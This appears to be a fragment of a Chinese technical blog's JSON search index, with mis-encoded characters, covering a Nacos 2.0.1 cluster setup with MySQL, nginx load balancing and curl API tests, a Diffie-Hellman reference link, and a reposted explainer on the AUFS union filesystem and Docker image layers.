10:33","objectID":"/post/2433/:0:3","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"4.è§£å‹å®‰è£… # ä¸‰å°æœºå™¨æ‰§è¡Œ tar xf nacos-server-2.0.1.tar.gz mv nacos /usr/local/ ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:4","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"5.åˆå§‹åŒ–nacosæ•°æ®åº“ copyåˆå§‹sql scp /usr/local/nacos/conf/nacos-mysql.sql 172.17.10.150: åˆ›å»ºæ•°æ®åº“,åˆå§‹åŒ–æ•°æ® mysql -uroot -p -h 172.17.10.150 create database nacos default character set utf8mb4 collate utf8mb4_unicode_ci; grant all on nacos.* to nacos@'172.17.10.%' identified by 'nacos'; use nacos source /root/nacos-mysql.sql ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:5","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"6.ä¿®æ”¹é…ç½® ä¿®æ”¹é›†ç¾¤é…ç½® cd /usr/local/nacos/conf # é…ç½®é›†ç¾¤èŠ‚ç‚¹ cat \u003e cluster.conf\u003c\u003cEOF 172.17.10.240:8848 172.17.10.241:8848 172.17.10.242:8848 EOF ä¿®æ”¹æ•°æ®æºå’Œæ—¥å¿—é…ç½® vim application.properties # å¦‚æœæœ¬åœ°æœ‰å¤šä¸ªåœ°å€ï¼Œå¯ä»¥æ‰‹åŠ¨æŒ‡å®šä¸€ä¸ªåœ°å€ # nacos.inetutils.ip-address= # ä½¿ç”¨mysqlæ•°æ®æº spring.datasource.platform=mysql # dbçš„æ•°é‡ db.num=1 db.url.0=jdbc:mysql://172.17.10.150:3306/nacos?characterEncoding=utf8\u0026connectTimeout=1000\u0026socketTimeout=3000\u0026autoReconnect=true\u0026useUnicode=true\u0026useSSL=false\u0026serverTimezone=UTC db.user.0=nacos db.password.0=nacos server.tomcat.accesslog.enabled=false å¤åˆ¶é…ç½®ç»™å…¶ä»–æœºå™¨ # å¤åˆ¶ç»™å…¶ä»–æœºå™¨ scp application.properties cluster.conf 172.17.10.241:/usr/local/nacos/conf/ scp application.properties cluster.conf 172.17.10.242:/usr/local/nacos/conf/ ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:6","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"7. å¯åŠ¨æœåŠ¡ # ä¸‰å°æœºå™¨éƒ½å¯åŠ¨ /usr/local/nacos/bin/startup.sh ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:7","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"8. ä½¿ç”¨nginxè´Ÿè½½ nginxé…ç½® upstream nacos-cluster{ server 172.17.10.240:8848; server 172.17.10.241:8848; server 172.17.10.242:8848; } server { listen 80 ; server_name my.nacos.cn; location / { proxy_pass http://nacos-cluster; } } ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:8","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"9. æµ‹è¯• # æ³¨å†ŒæœåŠ¡ curl -X POST 'http://my.nacos.cn/nacos/v1/ns/instance?port=8848\u0026healthy=true\u0026ip=11.11.11.11\u0026weight=1.0\u0026serviceName=soulchild\u0026namespaceId=public' # æœåŠ¡å‘ç° curl -X GET 'http://my.nacos.cn/nacos/v1/ns/instance/list?serviceName=soulchild' # å‘å¸ƒé…ç½® curl -X POST \"http://my.nacos.cn/nacos/v1/cs/configs?dataId=nacos.cfg.dataId\u0026group=test\u0026content=helloWorld\" # è·å–é…ç½® curl -X GET \"http://my.nacos.cn/nacos/v1/cs/configs?dataId=nacos.cfg.dataId\u0026group=test\" # æŸ¥çœ‹é›†ç¾¤çŠ¶æ€ curl -s -X GET 'http://my.nacos.cn/nacos/v1/ns/operator/servers' | jq .servers ","date":"2021-06-10 10:33","objectID":"/post/2433/:0:9","tags":["nacos"],"title":"nacos 2.0.1é›†ç¾¤éƒ¨ç½²","uri":"/post/2433/"},{"categories":["å…¶ä»–"],"content":"å‚è€ƒé“¾æ¥: https://zh.wikipedia.org/wiki/%E8%BF%AA%E8%8F%B2-%E8%B5%AB%E7%88%BE%E6%9B%BC%E5%AF%86%E9%91%B0%E4%BA%A4%E6%8F%9B 60034-glwuxgi0ons.png 11661-4uxz1mlbp5b.png ","date":"2021-06-08 15:36","objectID":"/post/2430/:0:0","tags":["ssl","tls"],"title":"Diffie-Hellman(DH)å¯†é’¥äº¤æ¢ç®—æ³•","uri":"/post/2430/"},{"categories":["å…¶ä»–"],"content":"åŸæ–‡åœ°å€: https://coolshell.cn/articles/17061.html 15937-eubb2wdk1d.png AUFSæ˜¯ä¸€ç§Union File Systemï¼Œæ‰€è°“UnionFSå°±æ˜¯æŠŠä¸åŒç‰©ç†ä½ç½®çš„ç›®å½•åˆå¹¶mountåˆ°åŒä¸€ä¸ªç›®å½•ä¸­ã€‚UnionFSçš„ä¸€ä¸ªæœ€ä¸»è¦çš„åº”ç”¨æ˜¯ï¼ŒæŠŠä¸€å¼ CD/DVDå’Œä¸€ä¸ªç¡¬ç›˜ç›®å½•ç»™è”åˆ mountåœ¨ä¸€èµ·ï¼Œç„¶åï¼Œä½ å°±å¯ä»¥å¯¹è¿™ä¸ªåªè¯»çš„CD/DVDä¸Šçš„æ–‡ä»¶è¿›è¡Œä¿®æ”¹ï¼ˆå½“ç„¶ï¼Œä¿®æ”¹çš„æ–‡ä»¶å­˜äºç¡¬ç›˜ä¸Šçš„ç›®å½•é‡Œï¼‰ã€‚ AUFSåˆå«Another UnionFSï¼Œåæ¥å«Alternative UnionFSï¼Œåæ¥å¯èƒ½è§‰å¾—ä¸å¤Ÿéœ¸æ°”ï¼Œå«æˆAdvance UnionFSã€‚æ˜¯ä¸ªå«Junjiro Okajimaï¼ˆå²¡å³¶é †æ²»éƒï¼‰åœ¨2006å¹´å¼€å‘çš„ï¼ŒAUFSå®Œå…¨é‡å†™äº†æ—©æœŸçš„UnionFS 1.xï¼Œå…¶ä¸»è¦ç›®çš„æ˜¯ä¸ºäº†å¯é æ€§å’Œæ€§èƒ½ï¼Œå¹¶ä¸”å¼•å…¥äº†ä¸€äº›æ–°çš„åŠŸèƒ½ï¼Œæ¯”å¦‚å¯å†™åˆ†æ”¯çš„è´Ÿè½½å‡è¡¡ã€‚AUFSåœ¨ä½¿ç”¨ä¸Šå…¨å…¼å®¹UnionFSï¼Œè€Œä¸”æ¯”ä¹‹å‰çš„UnionFSåœ¨ç¨³å®šæ€§å’Œæ€§èƒ½ä¸Šéƒ½è¦å¥½å¾ˆå¤šï¼Œåæ¥çš„UnionFS 2.xå¼€å§‹æŠ„AUFSä¸­çš„åŠŸèƒ½ã€‚ä½†æ˜¯ä»–å±…ç„¶æ²¡æœ‰è¿›åˆ°Linuxä¸»å¹²é‡Œï¼Œå°±æ˜¯å› ä¸ºLinusä¸è®©ï¼ŒåŸºæœ¬ä¸Šæ˜¯å› ä¸ºä»£ç é‡æ¯”è¾ƒå¤šï¼Œè€Œä¸”å†™å¾—çƒ‚ï¼ˆç›¸å¯¹äºåªæœ‰3000è¡Œçš„union mountå’Œ10000è¡Œçš„UnionFSï¼Œä»¥åŠå…¶å®ƒå¹³å‡ä¸‹æ¥åªæœ‰6000è¡Œä»£ç å·¦å³çš„VFSï¼ŒAUFSå±…ç„¶æœ‰30000è¡Œä»£ç ï¼‰ï¼Œæ‰€ä»¥ï¼Œå²¡å³¶ä¸æ–­åœ°æ”¹è¿›ä»£ç è´¨é‡ï¼Œä¸æ–­åœ°æäº¤ï¼Œä¸æ–­åœ°è¢«Linusæ‹’æ‰ï¼Œæ‰€ä»¥ï¼Œåˆ°ä»Šå¤©AUFSéƒ½è¿˜è¿›ä¸äº†Linuxä¸»å¹²ï¼ˆä»Šå¤©ä½ å¯ä»¥çœ‹åˆ°AUFSçš„ä»£ç å…¶å®è¿˜å¥½äº†ï¼Œæ¯”èµ·OpenSSLå¥½Nå€ï¼Œè¦ä¹ˆå°±æ˜¯Linuså¯¹ä»£ç çš„è´¨é‡è¦æ±‚éå¸¸é«˜ï¼Œè¦ä¹ˆå°±æ˜¯Linuså°±æ˜¯ä¸å–œæ¬¢AUFSï¼‰ã€‚ ä¸è¿‡ï¼Œå¥½åœ¨æœ‰å¾ˆå¤šå‘è¡Œç‰ˆéƒ½ç”¨äº†AUFSï¼Œæ¯”å¦‚ï¼šUbuntu 10.04ï¼ŒDebian6.0, Gentoo Live CDæ”¯æŒAUFSï¼Œæ‰€ä»¥ï¼Œä¹ŸOKäº†ã€‚ å¥½äº†ï¼Œæ‰¯å®Œè¿™äº›é—²è¯ï¼Œæˆ‘ä»¬è¿˜æ˜¯çœ‹ä¸€ä¸ªç¤ºä¾‹å§ï¼ˆç¯å¢ƒï¼šUbuntu 14.04ï¼‰ é¦–å…ˆï¼Œæˆ‘ä»¬å»ºä¸Šä¸¤ä¸ªç›®å½•ï¼ˆæ°´æœå’Œè”¬èœï¼‰ï¼Œå¹¶åœ¨è¿™ä¸¤ä¸ªç›®å½•ä¸­æ”¾ä¸Šä¸€äº›æ–‡ä»¶ï¼Œæ°´æœä¸­æœ‰è‹¹æœå’Œè•ƒèŒ„ï¼Œè”¬èœæœ‰èƒ¡èåœå’Œè•ƒèŒ„ã€‚ $ tree . â”œâ”€â”€ fruits â”‚ â”œâ”€â”€ apple â”‚ â””â”€â”€ tomato â””â”€â”€ vegetables â”œâ”€â”€ carrots â””â”€â”€ tomato ç„¶åï¼Œæˆ‘ä»¬è¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š # åˆ›å»ºä¸€ä¸ªmountç›®å½• $ mkdir mnt # æŠŠæ°´æœç›®å½•å’Œè”¬èœç›®å½•union mountåˆ° ./mntç›®å½•ä¸­ $ sudo mount -t aufs -o dirs=./fruits:./vegetables none ./mnt # æŸ¥çœ‹./mntç›®å½• $ tree ./mnt ./mnt â”œâ”€â”€ apple â”œâ”€â”€ carrots â””â”€â”€ tomato æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨./mntç›®å½•ä¸‹æœ‰ä¸‰ä¸ªæ–‡ä»¶ï¼Œè‹¹æœappleã€èƒ¡èåœcarrotså’Œè•ƒèŒ„tomatoã€‚æ°´æœå’Œè”¬èœçš„ç›®å½•è¢«unionåˆ°äº†./mntç›®å½•ä¸‹äº†ã€‚ æˆ‘ä»¬æ¥ä¿®æ”¹ä¸€ä¸‹å…¶ä¸­çš„æ–‡ä»¶å†…å®¹ï¼š $ echo mnt \u003e ./mnt/apple $ cat ./mnt/apple mnt $ cat ./fruits/apple mnt ä¸Šé¢çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°./mnt/appleçš„å†…å®¹æ”¹äº†ï¼Œ./fruits/appleçš„å†…å®¹ä¹Ÿæ”¹äº†ã€‚ $ echo mnt_carrots \u003e ./mnt/carrots $ cat ./vegetables/carrots $ cat ./fruits/carrots mnt_carrots ä¸Šé¢çš„ç¤ºä¾‹ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œæˆ‘ä»¬ä¿®æ”¹äº†./mnt/carrotsçš„æ–‡ä»¶å†…å®¹ï¼Œ./vegetables/carrotså¹¶æ²¡æœ‰å˜åŒ–ï¼Œåè€Œæ˜¯./fruits/carrotsçš„ç›®å½•ä¸­å‡ºç°äº†carrotsæ–‡ä»¶ï¼Œå…¶å†…å®¹æ˜¯æˆ‘ä»¬åœ¨./mnt/carrotsé‡Œçš„å†…å®¹ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬åœ¨mount aufså‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬æ²¡æœ‰æŒ‡å®ƒvegetableså’Œfruitsçš„ç›®å½•æƒé™ï¼Œé»˜è®¤ä¸Šæ¥è¯´ï¼Œå‘½ä»¤è¡Œä¸Šç¬¬ä¸€ä¸ªï¼ˆæœ€å·¦è¾¹ï¼‰çš„ç›®å½•æ˜¯å¯è¯»å¯å†™çš„ï¼Œåé¢çš„å…¨éƒ½æ˜¯åªè¯»çš„ã€‚ï¼ˆä¸€èˆ¬æ¥è¯´ï¼Œæœ€å‰é¢çš„ç›®å½•åº”è¯¥æ˜¯å¯å†™çš„ï¼Œè€Œåé¢çš„éƒ½åº”è¯¥æ˜¯åªè¯»çš„ï¼‰ æ‰€ä»¥ï¼Œå¦‚æœæˆ‘ä»¬åƒä¸‹é¢è¿™æ ·æŒ‡å®šæƒé™æ¥mount aufsï¼Œä½ å°±ä¼šå‘ç°æœ‰ä¸ä¸€æ ·çš„æ•ˆæœï¼ˆè®°å¾—å…ˆæŠŠä¸Šé¢./fruits/carrotsçš„æ–‡ä»¶åˆ é™¤äº†ï¼‰ï¼š $ sudo mount -t aufs -o dirs=./fruits=rw:./vegetables=rw none ./mnt $ echo \"mnt_carrots\" \u003e ./mnt/carrots $ cat ./vegetables/carrots mnt_carrots $ cat ./fruits/carrots cat: ./fruits/carrots: No such file or directory ç°åœ¨ï¼Œåœ¨è¿™æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬è¦ä¿®æ”¹./mnt/tomatoè¿™ä¸ªæ–‡ä»¶ï¼Œé‚£ä¹ˆç©¶ç«Ÿæ˜¯å“ªä¸ªæ–‡ä»¶ä¼šè¢«æ”¹å†™ï¼Ÿ $ echo \"mnt_tomato\" \u003e ./mnt/tomato $ cat ./fruits/tomato mnt_tomato $ cat ./vegetables/tomato I am a vegetable å¯è§ï¼Œå¦‚æœæœ‰é‡å¤çš„æ–‡ä»¶åï¼Œåœ¨mountå‘½ä»¤è¡Œä¸Šï¼Œè¶Šå¾€å‰çš„å°±ä¼˜å…ˆçº§è¶Šé«˜ã€‚ ä½ å¯ä»¥ç”¨è¿™ä¸ªä¾‹å­åšä¸€äº›å„ç§å„æ ·çš„è¯•éªŒï¼Œæˆ‘è¿™é‡Œä¸»è¦æ˜¯ç»™å¤§å®¶ä¸€ä¸ªæ„Ÿæ€§è®¤è¯†ï¼Œå°±ä¸å±•å¼€è¯•éªŒä¸‹å»äº†ã€‚ é‚£ä¹ˆï¼Œè¿™ç§UnionFSæœ‰ä»€ä¹ˆç”¨ï¼Ÿ å†å²ä¸Šï¼Œæœ‰ä¸€ä¸ªå«Knoppixçš„Linuxå‘è¡Œç‰ˆï¼Œå…¶ä¸»è¦ç”¨äºLinuxæ¼”ç¤ºã€å…‰ç›˜æ•™å­¦ã€ç³»ç»Ÿæ€¥æ•‘ï¼Œä»¥åŠå•†ä¸šäº§å“çš„æ¼”ç¤ºï¼Œä¸éœ€è¦ç¡¬ç›˜å®‰è£…ï¼Œç›´æ¥æŠŠCD/DVDä¸Šçš„imageè¿è¡Œåœ¨ä¸€ä¸ªå¯å†™çš„å­˜å‚¨è®¾å¤‡ä¸Šï¼ˆæ¯”å¦‚ä¸€ä¸ªUç›˜ä¸Šï¼‰ï¼Œå…¶å®ï¼Œä¹Ÿå°±æ˜¯æŠŠCD/DVDè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿå’ŒUSBè¿™ä¸ªå¯å†™çš„ç³»ç»Ÿç»™è”åˆmountèµ·æ¥ï¼Œè¿™æ ·ä½ å¯¹CD/DVDä¸Šçš„imageåšçš„ä»»ä½•æ”¹åŠ¨éƒ½ä¼šåœ¨è¢«åº”ç”¨åœ¨Uç›˜ä¸Šï¼Œäºæ˜¯ä¹ï¼Œä½ å¯ä»¥å¯¹CD/DVDä¸Šçš„å†…å®¹è¿›è¡Œä»»æ„çš„ä¿®æ”¹ï¼Œå› ä¸ºæ”¹åŠ¨éƒ½åœ¨Uç›˜ä¸Šï¼Œæ‰€ä»¥ä½ æ”¹ä¸ååŸæ¥çš„ä¸œè¥¿ã€‚ æˆ‘ä»¬å¯ä»¥å†å‘æŒ¥ä¸€ä¸‹æƒ³åƒåŠ›ï¼Œä½ ä¹Ÿå¯ä»¥æŠŠä¸€ä¸ªç›®å½•ï¼Œæ¯”å¦‚ä½ çš„æºä»£ç ï¼Œä½œä¸ºä¸€ä¸ªåªè¯»çš„templateï¼Œå’Œå¦ä¸€ä¸ªä½ çš„working directoryç»™unionåœ¨ä¸€èµ·ï¼Œç„¶åä½ å°±å¯ä»¥åšå„ç§ä¿®æ”¹è€Œä¸ç”¨å®³æ€•ä¼šæŠŠæºä»£ç æ”¹åäº†ã€‚æœ‰ç‚¹åƒä¸€ä¸ªad hoc snapshotã€‚ DockeræŠŠUnionFSçš„æƒ³åƒåŠ›å‘æŒ¥åˆ°äº†å®¹å™¨çš„é•œåƒã€‚ä½ æ˜¯å¦è¿˜è®°å¾—æˆ‘åœ¨ä»‹ç»Linux Namespaceä¸Šç¯‡ä¸­ç”¨mount namespaceå’Œchrootå±±å¯¨äº†ä¸€é•œåƒã€‚ç°åœ¨å½“ä½ çœ‹è¿‡äº†è¿™ä¸ªUnionFSçš„æŠ€æœ¯åï¼Œä½ æ˜¯ä¸æ˜¯å°±æ˜ç™½äº†ï¼Œä½ å®Œå…¨å¯ä»¥ç”¨UnionFSè¿™æ ·çš„æŠ€æœ¯åšå‡ºåˆ†å±‚çš„é•œåƒæ¥ã€‚ ä¸‹å›¾æ¥è‡ªDockerçš„å®˜æ–¹æ–‡æ¡£Layerï¼Œå…¶å¾ˆå¥½çš„å±•ç¤ºäº†Dockerç”¨UnionFSæ­å»ºçš„åˆ†å±‚é•œåƒã€‚ 38252-3yzl8jcxokj.png å…³äºdockerçš„åˆ†å±‚é•œåƒï¼Œé™¤äº†aufsï¼Œdockerè¿˜æ”¯æŒbtrfs, devicemapperå’Œvfsï¼Œä½ å¯ä»¥ä½¿ç”¨ -s æˆ– â€“storage-driver= é€‰é¡¹æ¥æŒ‡å®šç›¸å…³çš„é•œåƒå­˜å‚¨ã€‚åœ¨Ubuntu 14.04ä¸‹ï¼Œdockeré»˜è®¤Ubuntuçš„ aufsï¼ˆåœ¨CentOS7ä¸‹ï¼Œç”¨çš„æ˜¯devicemapperï¼Œå…³äºdevicemapperï¼Œæˆ‘ä¼šä»¥ä»¥åçš„æ–‡ç« ä¸­è®²è§£ï¼‰ä½ å¯ä»¥åœ¨ä¸‹é¢çš„ç›®å½•ä¸­æŸ¥çœ‹ç›¸å…³çš„æ¯ä¸ªå±‚çš„é•œåƒï¼š /var/lib/docker/aufs/diff/\u003cid\u003e åœ¨dockeræ‰§è¡Œèµ·æ¥åï¼ˆæ¯”å¦‚ï¼šdocker run -it ubuntu /bin/bash ï¼‰ï¼Œä½ å¯ä»¥ä»/sys/fs/aufs/si_[id]ç›®å½•ä¸‹æŸ¥çœ‹aufsçš„mountçš„æƒ…å†µï¼Œä¸‹é¢æ˜¯ä¸ªç¤ºä¾‹ï¼š #ls /sys/fs/aufs/si_b71b209f85ff8e75/ br0 br2 br4 br6 brid1 brid3 brid5 xi_path br1 br3 br5 brid0 brid2 brid4 brid6 # cat /sys/fs/aufs/si_b71b209f85ff8e75/* /var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7=rw /var/lib/docker/aufs/diff/87315f1367e5703f599168d1e17528a0500bd2e2df7d2fe2aaf9595f3697dbd7-init=ro+wh /var/lib/docker/aufs/diff/d0955f21bf24f5bfffd32d2d0bb669d0564701c271bc3dfc64cfc5adfdec2d07=ro+wh /var/lib/docker/aufs/diff/9fec74352904baf5ab5237caa39a84b0af5c593dc7cc08839e2ba65193024507=ro+wh /var/lib/docker/aufs/diff/a1a958a248181c9aa6413848cd67646e5afb9797f1a3da5995c7a636f050f537=ro+wh /var/lib/docker/aufs/diff/f3c84ac3a0533f691c9fea4cc2ceaaf43baec22bf8d6a479e069f6d814be9b86=ro+wh /var/lib/docker/aufs/diff/511136ea3c5a64f264b78b5433614aec563103","date":"2021-05-31 14:50","objectID":"/post/2418/:0:0","tags":["docker"],"title":"DOCKERåŸºç¡€æŠ€æœ¯ï¼šAUFS(è½¬)","uri":"/post/2418/"},{"categories":["å…¶ä»–"],"content":"AUFSçš„ä¸€äº›ç‰¹æ€§ AUFSæœ‰æ‰€æœ‰Union FSçš„ç‰¹æ€§ï¼ŒæŠŠå¤šä¸ªç›®å½•ï¼Œåˆå¹¶æˆåŒä¸€ä¸ªç›®å½•ï¼Œå¹¶å¯ä»¥ä¸ºæ¯ä¸ªéœ€è¦åˆå¹¶çš„ç›®å½•æŒ‡å®šç›¸åº”çš„æƒé™ï¼Œå®æ—¶çš„æ·»åŠ ã€åˆ é™¤ã€ä¿®æ”¹å·²ç»è¢«mountå¥½çš„ç›®å½•ã€‚è€Œä¸”ï¼Œä»–è¿˜èƒ½åœ¨å¤šä¸ªå¯å†™çš„branch/diré—´è¿›è¡Œè´Ÿè½½å‡è¡¡ã€‚ ä¸Šé¢çš„ä¾‹å­ï¼Œæˆ‘ä»¬å·²ç»çœ‹åˆ°AUFSçš„mountçš„ç¤ºä¾‹äº†ã€‚ä¸‹é¢æˆ‘ä»¬æ¥çœ‹ä¸€çœ‹è¢«unionçš„ç›®å½•ï¼ˆåˆ†æ”¯ï¼‰çš„ç›¸å…³æƒé™ï¼š rwè¡¨ç¤ºå¯å†™å¯è¯»read-writeã€‚ roè¡¨ç¤ºread-onlyï¼Œå¦‚æœä½ ä¸æŒ‡æƒé™ï¼Œé‚£ä¹ˆé™¤äº†ç¬¬ä¸€ä¸ªå¤–roæ˜¯é»˜è®¤å€¼ï¼Œå¯¹äºroåˆ†æ”¯ï¼Œå…¶æ°¸è¿œä¸ä¼šæ”¶åˆ°å†™æ“ä½œï¼Œä¹Ÿä¸ä¼šæ”¶åˆ°æŸ¥æ‰¾whiteoutçš„æ“ä½œã€‚ rrè¡¨ç¤ºreal-read-onlyï¼Œä¸read-onlyä¸åŒçš„æ˜¯ï¼Œrræ ‡è®°çš„æ˜¯å¤©ç”Ÿå°±æ˜¯åªè¯»çš„åˆ†æ”¯ï¼Œè¿™æ ·ï¼ŒAUFSå¯ä»¥æé«˜æ€§èƒ½ï¼Œæ¯”å¦‚ä¸å†è®¾ç½®inotifyæ¥æ£€æŸ¥æ–‡ä»¶å˜åŠ¨é€šçŸ¥ã€‚ æƒé™ä¸­ï¼Œæˆ‘ä»¬çœ‹åˆ°äº†ä¸€ä¸ªæœ¯è¯­ï¼šwhiteoutï¼Œä¸‹é¢æˆ‘æ¥è§£é‡Šä¸€ä¸‹è¿™ä¸ªæœ¯è¯­ã€‚ ä¸€èˆ¬æ¥è¯´roçš„åˆ†æ”¯éƒ½ä¼šæœ‰whçš„å±æ€§ï¼Œæ¯”å¦‚ â€œ[dir]=ro+whâ€ã€‚æ‰€è°“whiteoutçš„æ„æ€ï¼Œå¦‚æœåœ¨unionä¸­åˆ é™¤çš„æŸä¸ªæ–‡ä»¶ï¼Œå®é™…ä¸Šæ˜¯ä½äºä¸€ä¸ªreadonlyçš„åˆ†æ”¯ï¼ˆç›®å½•ï¼‰ä¸Šï¼Œé‚£ä¹ˆï¼Œåœ¨mountçš„unionè¿™ä¸ªç›®å½•ä¸­ä½ å°†çœ‹ä¸åˆ°è¿™ä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯read-onlyè¿™ä¸ªå±‚ä¸Šæˆ‘ä»¬æ— æ³•åšä»»ä½•çš„ä¿®æ”¹ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬å°±éœ€è¦å¯¹è¿™ä¸ªreadonlyç›®å½•é‡Œçš„æ–‡ä»¶ä½œwhiteoutã€‚AUFSçš„whiteoutçš„å®ç°æ˜¯é€šè¿‡åœ¨ä¸Šå±‚çš„å¯å†™çš„ç›®å½•ä¸‹å»ºç«‹å¯¹åº”çš„whiteoutéšè—æ–‡ä»¶æ¥å®ç°çš„ã€‚ çœ‹ä¸ªä¾‹å­ï¼š å‡è®¾æˆ‘ä»¬æœ‰ä¸‰ä¸ªç›®å½•å’Œæ–‡ä»¶å¦‚ä¸‹æ‰€ç¤ºï¼ˆtestæ˜¯ä¸ªç©ºç›®å½•ï¼‰ï¼š # tree . â”œâ”€â”€ fruits â”‚ â”œâ”€â”€ apple â”‚ â””â”€â”€ tomato â”œâ”€â”€ test â””â”€â”€ vegetables â”œâ”€â”€ carrots â””â”€â”€ tomato æˆ‘ä»¬å¦‚ä¸‹mountï¼š # mkdir mnt # mount -t aufs -o dirs=./test=rw:./fruits=ro:./vegetables=ro none ./mnt # # ls ./mnt/ apple carrots tomato ç°åœ¨æˆ‘ä»¬åœ¨æƒé™ä¸ºrwçš„testç›®å½•ä¸‹å»ºä¸ªwhiteoutçš„éšè—æ–‡ä»¶.wh.appleï¼Œä½ å°±ä¼šå‘ç°./mnt/appleè¿™ä¸ªæ–‡ä»¶å°±æ¶ˆå¤±äº†: # touch ./test/.wh.apple # ls ./mnt carrots tomato ä¸Šé¢è¿™ä¸ªæ“ä½œå’Œ rm ./mnt/appleæ˜¯ä¸€æ ·çš„ã€‚ ","date":"2021-05-31 14:50","objectID":"/post/2418/:1:0","tags":["docker"],"title":"DOCKERåŸºç¡€æŠ€æœ¯ï¼šAUFS(è½¬)","uri":"/post/2418/"},{"categories":["å…¶ä»–"],"content":"ç›¸å…³æœ¯è¯­ Branch â€“ å°±æ˜¯å„ä¸ªè¦è¢«unionèµ·æ¥çš„ç›®å½•ï¼ˆå°±æ˜¯æˆ‘åœ¨ä¸Šé¢ä½¿ç”¨çš„dirsçš„å‘½ä»¤è¡Œå‚æ•°ï¼‰ ÂšBranchæ ¹æ®è¢«unionçš„é¡ºåºå½¢æˆä¸€ä¸ªstackï¼Œä¸€èˆ¬æ¥è¯´æœ€ä¸Šé¢çš„æ˜¯å¯å†™çš„ï¼Œä¸‹é¢çš„éƒ½æ˜¯åªè¯»çš„ã€‚ ÂšBranchçš„stackå¯ä»¥åœ¨è¢«mountåè¿›è¡Œä¿®æ”¹ï¼Œæ¯”å¦‚ï¼šä¿®æ”¹é¡ºåºï¼ŒåŠ å…¥æ–°çš„branchï¼Œæˆ–æ˜¯åˆ é™¤å…¶ä¸­çš„branchï¼Œæˆ–æ˜¯ç›´æ¥ä¿®æ”¹branchçš„æƒé™ ÂšWhiteout å’Œ Opaque Âšå¦‚æœUnionFSä¸­çš„æŸä¸ªç›®å½•è¢«åˆ é™¤äº†ï¼Œé‚£ä¹ˆå°±åº”è¯¥ä¸å¯è§äº†ï¼Œå°±ç®—æ˜¯åœ¨åº•å±‚çš„branchä¸­è¿˜æœ‰è¿™ä¸ªç›®å½•ï¼Œé‚£ä¹Ÿåº”è¯¥ä¸å¯è§äº†ã€‚ ÂšWhiteoutå°±æ˜¯æŸä¸ªä¸Šå±‚ç›®å½•è¦†ç›–äº†ä¸‹å±‚çš„ç›¸åŒåå­—çš„ç›®å½•ã€‚ç”¨äºéšè—ä½å±‚åˆ†æ”¯çš„æ–‡ä»¶ï¼Œä¹Ÿç”¨äºé˜»æ­¢readdirè¿›å…¥ä½å±‚åˆ†æ”¯ã€‚ ÂšOpaqueçš„æ„æ€å°±æ˜¯ä¸å…è®¸ä»»ä½•ä¸‹å±‚çš„æŸä¸ªç›®å½•æ˜¾ç¤ºå‡ºæ¥ã€‚ Âšåœ¨éšè—ä½å±‚æ¡£çš„æƒ…å†µä¸‹ï¼Œwhiteoutçš„åå­—æ˜¯â€™.wh.â€™ã€‚ Âšåœ¨é˜»æ­¢readdirçš„æƒ…å†µä¸‹ï¼Œåå­—æ˜¯â€™.wh..wh..opqâ€™æˆ–è€… â€™.wh.__dir_opaqueâ€™ã€‚ ","date":"2021-05-31 14:50","objectID":"/post/2418/:2:0","tags":["docker"],"title":"DOCKERåŸºç¡€æŠ€æœ¯ï¼šAUFS(è½¬)","uri":"/post/2418/"},{"categories":["å…¶ä»–"],"content":"ç›¸å…³é—®é¢˜ çœ‹åˆ°ä¸Šé¢è¿™äº›ï¼Œä½ ä¸€å®šä¼šæœ‰å‡ ä¸ªé—®é¢˜ï¼š ","date":"2021-05-31 14:50","objectID":"/post/2418/:3:0","tags":["docker"],"title":"DOCKERåŸºç¡€æŠ€æœ¯ï¼šAUFS(è½¬)","uri":"/post/2418/"},{"categories":["å…¶ä»–"],"content":"å…¶ä¸€ã€ä½ å¯èƒ½ä¼šé—®ï¼Œè¦æœ‰æ–‡ä»¶åœ¨åŸæ¥çš„åœ°æ–¹è¢«ä¿®æ”¹äº†ä¼šæ€ä¹ˆæ ·ï¼Ÿmountçš„ç›®å½•ä¼šä¸€èµ·æ”¹å˜å—ï¼Ÿç­”æ¡ˆæ˜¯ä¼šçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯ä¸ä¼šçš„ã€‚å› ä¸ºä½ å¯ä»¥æŒ‡å®šä¸€ä¸ªå«udbaçš„å‚æ•°ï¼ˆå…¨ç§°ï¼šUserâ€™s Direct Branch Accessï¼‰ï¼Œè¿™ä¸ªå‚æ•°æœ‰ä¸‰ä¸ªå–å€¼ï¼š udba=none â€“ è®¾ç½®ä¸Šè¿™ä¸ªå‚æ•°åï¼ŒAUFSä¼šè¿è½¬çš„æ›´å¿«ï¼Œå› 